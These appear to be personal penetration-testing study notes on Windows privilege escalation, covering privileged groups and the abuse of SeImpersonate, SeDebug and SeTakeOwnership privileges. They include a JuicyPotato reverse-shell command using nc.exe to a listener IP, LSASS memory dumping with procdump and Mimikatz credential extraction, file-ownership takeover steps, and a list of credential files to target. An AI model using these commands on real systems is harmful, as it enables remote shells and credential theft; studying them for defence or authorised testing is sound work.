
Authority Levels:
	1. NT Authority\ System 
	2. administrator 
	3. Administrators 
	4. non-privileged domain user part of admin group.
	5. Domain user part of a Administrator group.

Authorisation Process 
	Every Security Identifier is identified by a unique Security Identifier (SID)
		https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers
	Windows authorisation and access control process
	 Users access tokens are compared against [Access Control Entries (ACE)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries)
	 		
	 ![[Windows Authorisation Process.png]]
		 https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-principals

Group/ User Rights and Privileges 
	[Master  List](https://ss64.com/nt/syntax-security_groups.html)
	Groups
		Default Administrators 
			Domain Admins and Enterprise Admins are "Super Groups"
		Server Operators 
			Members can modify services, access SMB shares and backup files
		Backup Operators
			Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.
		Print Operators
			Members can logon to DCs locally and "trick" windows into loading a malicious driver. 
		Hyper-V Administrators
			If a Virtual DCs is present these should be considered domain admins
		Account Operators
			Modify non-protected accounts and groups in the domain
		Remote Desktop Users
			Not given any useful permission by default but often given rights such as: "Alow Login through RDP" and can move laterally through RDP
		Remote Management Users 
			Can log on to DCs with PSremoting
		Group Policy Creator Owners
			can create new GPOs but would never be delegated permissions to link GPOs to a container like a DC
		Schema Admins
			Members can modify the Active Directory schema structure and backdoor any-to-be created Group/GPO by adding a compromised account to the default object ACL.
		DNS Admins
			Can load DLL in a DC. Cannot restart the DNS server. Load a malicious DLL and wait for reboot as a persistence mechanism.  
			May often result in a crash. better to exploit a WDAP record. 
				https://cube0x0.github.io/Pocing-Beyond-DA/
	Users
		https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment
		List user assigned rights - whoami /priv
	Standard rights 
		Administrator	```
			SeIncreaseQuotaPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeSystemProfilePrivilege
			SeSystemtimePrivilege
			SeProfileSingleProcessPrivilege
			SeIncreaseBasePriorityPrivilege
			SeCreatePagefilePrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeShutdownPrivilege 
			SeDebugPrivilege    
			SeSystemEnvironmentPrivilege
			SeChangeNotifyPrivilege
			SeRemoteShutdownPrivilege 
			SeUndockPrivilege
			SeManageVolumePrivilege
			SeImpersonatePrivilege
			SeCreateGlobalPrivilege
			SeIncreaseWorkingSetPrivilege
			SeTimeZonePrivilege
			SeCreateSymbolicLinkPrivilege
			SeDelegateSessionUserImpersonatePrivilege
			```
		User  ```
			SeChangeNotifyPrivilege
			SeIncreaseWorkingSetPrivilege
			```
		Backup Operator ```
			SeShutdownPrivilege 
			SeChangeNotifiyPrivilege
			SeIncreaseWorkingSePrivilege
			```

SeImpersonate and SeAssignPrimaryToken
	SeImpersonate privilege is needed to utilise tokens. 
		[Only given to administrative accounts.](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
		Can call other process token to escalate privileges to system. 
			Make a call to the WinLogon process to get a system token.
			[Trick a process into running as System to connect to their process.](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)
	Use JuicyPotato to escalate privileges.
		```xp_cmdshell <dir to file>JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <listner ip> <listen port> -e cmd.exe" -t * ```
		``` sudo nc -lnvp 8443  ```
		Windows Server 2019 and Windows 10 1809+
			Need to use PrintSpoofer / RoguePotato instead.

SeDebugPrivilige
	Run an application or service with troubleshooting with this privilege.
		By default only administrators are assigned this.
	Use [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) to leverage the privilege and dump process memory. *(LSASS WORKS WELL)*
			`procdump.exe -accepteula -ma lsass.exe lsass.dmp`
			This can then be loaded into Mimikatz
				`mimikatz.exe`
				`sekurlsa::minidump lsass.dmp`
				`sekurlsa::logonpasswords`
		Manual dump of LSASS memory from task manager.
		![[Dump File.png]] 
[Remote Code Execution](https://decoder.cloud/2018/02/02/getting-system/)
	[Script to use:](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
				Run with this syntax : `[MyProcess]::CreateProcessFromParent(<system_pid>,"c:\windows\system32\cmd.exe" <or any cmd>,"")`
			get the system pid with `tasklist`
			![[psgetsys script.png]]

SeTakeOwnershipPrivilige
	Allows a user to take ownership of any "securable object"
		Active Directory objects, NTFS files/folders, printers, registry keys, services and processes.
	Assigns WRITE_OWNER rights
	Most commonly service user accounts. 
	![[SeTakeOwnership Privilige.png]]
		- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`
[How to leverage:](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77)
	[Script to use:](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
	`whoami /priv`
		check you have privilege
	`Import-Module .\Enable-Privilege.ps1`
	`.\EnableAllTokenPrivs.ps1`
	`whoami /priv`
	Target an interesting file you have found:
		```Get-ChildItem -Path '<file to target>' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}```
	Check File Ownership:
		 `cmd /c dir /q '<path to folder>'`
	 Take Ownership of file:
			`takeown /f '<path to file>'
	Confirming Ownership Changed:
		`Get-ChildItem -Path <path to file>' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}`
	ACL may need to be modified:
		`icacls '<path to file>' /grant <username>:F'
	Interesting Files:
		````c:\inetpub\wwwwroot\web.config
		%WINDIR%\repair\sam
		%WINDIR%\repair\system
		%WINDIR%\system32\config\SecEvent.Evt
		%WINDIR%\system32\config\default.sav
		%WINDIR%\system32\config\security.sav
		%WINDIR%\system32\config\software.sav
		%WINDIR%\system32\config\system.sav
		passwords.*
		pass.*
		creds.*
		*.kdbx
		````
